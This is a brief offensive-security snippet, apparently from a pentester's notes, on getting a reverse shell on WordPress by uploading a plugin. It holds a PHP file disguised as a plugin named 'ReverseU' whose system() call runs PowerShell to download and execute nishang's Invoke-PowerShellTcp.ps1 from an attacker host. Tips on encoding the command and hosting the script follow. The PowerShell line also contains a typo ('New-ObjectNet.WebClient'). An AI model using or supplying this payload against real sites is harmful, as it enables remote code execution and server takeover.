# Wordpress Reverse shell via Plguin Upload
```
<?php
/**
 * Plugin Name: ReverseU
 * Version: 5.6.5
 * Author: Mashiroro
 * Author URI: https://github.com/Mashiroro
 * License: GPL2
 */

echo system('powershell.exe IEX (New-ObjectNet.WebClient).DownloadString("{IP}/Invoke-PowerShellTcp.ps1")');
?>
```
> Take note if the powershell refuses to execute, you have to encode it.
> You have to host a website with downloading options
> Invoke-PowerShellTCP.ps1 is from nishang



